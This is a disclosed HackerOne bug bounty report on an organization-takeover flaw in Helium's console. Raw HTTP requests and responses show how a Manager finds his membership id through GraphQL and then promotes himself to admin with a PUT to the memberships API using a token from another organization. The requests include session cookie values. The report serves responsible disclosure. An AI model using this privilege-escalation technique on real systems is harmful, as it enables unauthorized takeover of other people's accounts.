---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/improper-access-control-generic
  - env/web
substate: "resolved"
weakness: "Improper Access Control - Generic"
enriched: true
body: true
date: 2020-05-27
submitted: 2020-03-03T18:24:21.869Z
bounty_usd: 500
votes: 263
cve: []
program: "[[programs/helium|Helium]]"
reporter: "azraelsec"
source: "https://hackerone.com/reports/809816"
title: "Organization Takeover"
---
# Organization Takeover

> **Severity:** High | **Bounty:** 500 USD | **Votes:** 263 | **Program:** Helium | **Disclosed:** 2020-05-27

- Report: [https://hackerone.com/reports/809816](https://hackerone.com/reports/809816)
- CWE: Improper Access Control - Generic
- Submitted: 2020-03-03T18:24:21.869Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hello @helium,
The **console.helium.com** application doesn't correctly manage the `/membership/` resources and allows a user to privilege escalate an organization of which he's part of just modifying it's role.

# Steps to reproduce the bug

1) Let's make two user accounts:
- `azraelsec@wearehackerone.com` **[A]**
- `███` **[B]** (*this is actually my personal account and can be deleted*)

**Initial Context**: azraelsec is Administrator of the `hackerone` organization while federicogerardi94 is Administrator of the **testhackerone** organization.
*Goal*: azraelsec becomes Administrator of **testhackerone**.

2) [B] invites [A] to take part in his **testhackerone** organization with the role of **Manager**

3) [A] switches to **testhackerone** organization and makes a graphql query to leak his **Manager** membership's id (using graphql it's only possible to see the memberships of the current organization):
```
POST /graphql HTTP/1.1
Host: console.helium.com
Connection: close
Content-Length: 488
accept: */*
Sec-Fetch-Dest: empty
authorization: Bearer [REDACTED-JWT]
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36
content-type: application/json
Origin: https://console.helium.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Referer: https://console.helium.com/users
Accept-Encoding: gzip, deflate
Accept-Language: it-IT,it;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6
Cookie: _ga=GA1.2.356414044.1583245182; _gid=GA1.2.514054915.1583245182; ajs_anonymous_id=%22b4ba3101-c694-4846-baa8-7c8327764369%22; ajs_group_id=null; ajs_user_id=1; intercom-id-ghj6l8hv=253a4abc-6b70-4491-9b80-b8b69c070546; intercom-session-ghj6l8hv=; _console_key=SFMyNTY.g3QAAAAA.vg9m7JVv2pR0cST_2fykHvzkeAyEyq8PdhkZ0fBMMiM; amplitude_id_2b23c37c10c54590bf3f2ba705df0be6helium.com=eyJkZXZpY2VJZCI6IjI4OGY3ZTJiLTRjNTgtNDEyOC1hNWUwLTliYjY0OTRkMzU2N1IiLCJ1c2VySWQiOiI1NTk0NmQwZS0wYTkwLTRkNGQtOWRiOC0xMjIzNjJmNTc3NTYiLCJvcHRPdXQiOmZhbHNlLCJzZXNzaW9uSWQiOjE1ODMyNDYzMzc1MzksImxhc3RFdmVudFRpbWUiOjE1ODMyNTQ3NDg0OTgsImV2ZW50SWQiOjE5MywiaWRlbnRpZnlJZCI6NDEsInNlcXVlbmNlTnVtYmVyIjoyMzR9

{"operationName":"PaginatedMembershipsQuery","variables":{"page":1,"pageSize":10},"query":"query PaginatedMembershipsQuery($page: Int, $pageSize: Int) {\n  memberships(page: $page, pageSize: $pageSize) {\n    entries {\n      ...MembershipFragment\n      __typename\n    }\n    totalEntries\n    totalPages\n    pageSize\n    pageNumber\n    __typename\n  }\n}\n\nfragment MembershipFragment on Membership {\n  id\n  email\n  role\n  inserted_at\n  two_factor_enabled\n  __typename\n}\n"}
```
```
HTTP/1.1 200 OK
Connection: close
Cache-Control: max-age=0, private, must-revalidate
Content-Length: 514
Content-Type: application/json; charset=utf-8
Date: Tue, 03 Mar 2020 16:59:27 GMT
Server: Cowboy
Strict-Transport-Security: max-age=31536000
Via: 1.1 vegur

{"data":{"memberships":{"__typename":"PaginatedMemberships","entries":[{"__typename":"Membership","email":"████████","id":"512c8188-7008-49ce-a140-3538696e8c2c","inserted_at":"2020-03-03T16:09:37","role":"admin","two_factor_enabled":false},{"__typename":"Membership","email":"azraelsec@wearehackerone.com","id":"bc96332e-c6b4-4728-b35e-8145eea0996a","inserted_at":"2020-03-03T16:42:49","role":"manager","two_factor_enabled":false}],"pageNumber":1,"pageSize":10,"totalEntries":2,"totalPages":1}}}
```
**NOTE**: [A] is a member of **testhackerone** with the role of **Manager** using the membership id `bc96332e-c6b4-4728-b35e-8145eea0996a`

3) [A] switches back to his **hackerone** organization (this will provide him a new full-privileged token) and sends a PUT request on the /membership/ resource pointing out the membership's id leaked before, changing his role to `admin`:
```
PUT /api/memberships/bc96332e-c6b4-4728-b35e-8145eea0996a HTTP/1.1
Host: console.helium.com
Connection: close
Content-Length: 31
accept: */*
Sec-Fetch-Dest: empty
authorization: Bearer [REDACTED-JWT]
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36
content-type: application/json
Origin: https://console.helium.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Referer: https://console.helium.com/users
Accept-Encoding: gzip, deflate
Accept-Language: it-IT,it;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6
Cookie: _ga=GA1.2.356414044.1583245182; _gid=GA1.2.514054915.1583245182; ajs_anonymous_id=%22b4ba3101-c694-4846-baa8-7c8327764369%22; ajs_group_id=null; ajs_user_id=1; intercom-id-ghj6l8hv=253a4abc-6b70-4491-9b80-b8b69c070546; intercom-session-ghj6l8hv=; _console_key=SFMyNTY.g3QAAAAA.vg9m7JVv2pR0cST_2fykHvzkeAyEyq8PdhkZ0fBMMiM; amplitude_id_2b23c37c10c54590bf3f2ba705df0be6helium.com=eyJkZXZpY2VJZCI6IjI4OGY3ZTJiLTRjNTgtNDEyOC1hNWUwLTliYjY0OTRkMzU2N1IiLCJ1c2VySWQiOiI1NTk0NmQwZS0wYTkwLTRkNGQtOWRiOC0xMjIzNjJmNTc3NTYiLCJvcHRPdXQiOmZhbHNlLCJzZXNzaW9uSWQiOjE1ODMyNDYzMzc1MzksImxhc3RFdmVudFRpbWUiOjE1ODMyNTEwNzEwNDEsImV2ZW50SWQiOjEzOSwiaWRlbnRpZnlJZCI6MjksInNlcXVlbmNlTnVtYmVyIjoxNjh9

{"membership":{"role":"admin"}}
```

Since the back-end only checks if the requesting account has is an admin in its actual organization' scope but not if the membership that he's modifying is related to this, the request works, allowing [A] to becoming **Administrator** of **hackeronetest** organization:
```
HTTP/1.1 200 OK
Connection: close
Cache-Control: max-age=0, private, must-revalidate
Content-Length: 154
Content-Type: application/json; charset=utf-8
Date: Tue, 03 Mar 2020 17:10:01 GMT
Message: User role updated successfully
Server: Cowboy
Strict-Transport-Security: max-age=31536000
Via: 1.1 vegur

{"email":"azraelsec@wearehackerone.com","id":"bc96332e-c6b4-4728-b35e-8145eea0996a","joined_at":"2020-03-03T16:42:49","role":"admin","type":"memberships"}
```

**NOTE**: [A] has to be sure not to switch to **testhackerone**!! To exploit the vulnerability [A] needs to remain inside the organization of which he is Administrator (a POST call to `/api/organizations/6c6c8c8a-49fe-4bef-a00c-fd99bee39b0d/switch` will invalidate the Bearer token and provide a new one that has the correct privileges).

4) Now [A] can switch again organization to **hackeronetest** and administrate it as Administrator:
```
POST /graphql HTTP/1.1
Host: console.helium.com
Connection: close
Content-Length: 488
accept: */*
Sec-Fetch-Dest: empty
authorization: Bearer [REDACTED-JWT]
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36
content-type: application/json
Origin: https://console.helium.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Referer: https://console.helium.com/users
Accept-Encoding: gzip, deflate
Accept-Language: it-IT,it;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6
Cookie: _ga=GA1.2.356414044.1583245182; _gid=GA1.2.514054915.1583245182; ajs_anonymous_id=%22b4ba3101-c694-4846-baa8-7c8327764369%22; ajs_group_id=null; ajs_user_id=1; intercom-id-ghj6l8hv=253a4abc-6b70-4491-9b80-b8b69c070546; intercom-session-ghj6l8hv=; _console_key=SFMyNTY.g3QAAAAA.vg9m7JVv2pR0cST_2fykHvzkeAyEyq8PdhkZ0fBMMiM; amplitude_id_2b23c37c10c54590bf3f2ba705df0be6helium.com=eyJkZXZpY2VJZCI6IjI4OGY3ZTJiLTRjNTgtNDEyOC1hNWUwLTliYjY0OTRkMzU2N1IiLCJ1c2VySWQiOiI1NTk0NmQwZS0wYTkwLTRkNGQtOWRiOC0xMjIzNjJmNTc3NTYiLCJvcHRPdXQiOmZhbHNlLCJzZXNzaW9uSWQiOjE1ODMyNDYzMzc1MzksImxhc3RFdmVudFRpbWUiOjE1ODMyNTU3MDI0MTAsImV2ZW50SWQiOjIwMywiaWRlbnRpZnlJZCI6NDMsInNlcXVlbmNlTnVtYmVyIjoyNDZ9

{"operationName":"PaginatedMembershipsQuery","variables":{"page":1,"pageSize":10},"query":"query PaginatedMembershipsQuery($page: Int, $pageSize: Int) {\n  memberships(page: $page, pageSize: $pageSize) {\n    entries {\n      ...MembershipFragment\n      __typename\n    }\n    totalEntries\n    totalPages\n    pageSize\n    pageNumber\n    __typename\n  }\n}\n\nfragment MembershipFragment on Membership {\n  id\n  email\n  role\n  inserted_at\n  two_factor_enabled\n  __typename\n}\n"}
```
```
HTTP/1.1 200 OK
Connection: close
Cache-Control: max-age=0, private, must-revalidate
Content-Length: 512
Content-Type: application/json; charset=utf-8
Date: Tue, 03 Mar 2020 17:17:12 GMT
Server: Cowboy
Strict-Transport-Security: max-age=31536000
Via: 1.1 vegur

{"data":{"memberships":{"__typename":"PaginatedMemberships","entries":[{"__typename":"Membership","email":"█████████","id":"512c8188-7008-49ce-a140-3538696e8c2c","inserted_at":"2020-03-03T16:09:37","role":"admin","two_factor_enabled":false},{"__typename":"Membership","email":"azraelsec@wearehackerone.com","id":"bc96332e-c6b4-4728-b35e-8145eea0996a","inserted_at":"2020-03-03T16:42:49","role":"admin","two_factor_enabled":false}],"pageNumber":1,"pageSize":10,"totalEntries":2,"totalPages":1}}}
```

## Impact

This vulnerability lets a user with low privileges to escalate and to **become Administrator of an Organization** of which was a simple Manager, deleting the original Administrator and to full control it

## Timeline

- **2020-03-03** @azraelsec: Here you are: a full video PoC of the vulnerability (the platform is changing, so the PoC changes privileges from "read" to "Administrator" instead of "Manager" to "Administrator")
- **Report Filed**
- **Report Triaged**
- **Bounty Awarded**
- **2020-03-14** @azraelsec: Thank you for this big bounty! Let me know when you fix this vulnerability and if we could proceed with a disclosure or not. I remain at your disposal for  further information about this bug.
- **2020-04-06** @azraelsec: Hello there, any news about this bug fix? Thanks
- **2020-04-15** @azraelsec: Hello @helium, could you please update this? Have you fixed this bug? It's really important to update the report's status.  Please, let me know asap. Thanks
- **Report Resolved**
- **Agreed On Going Public**
- **Report Became Public**
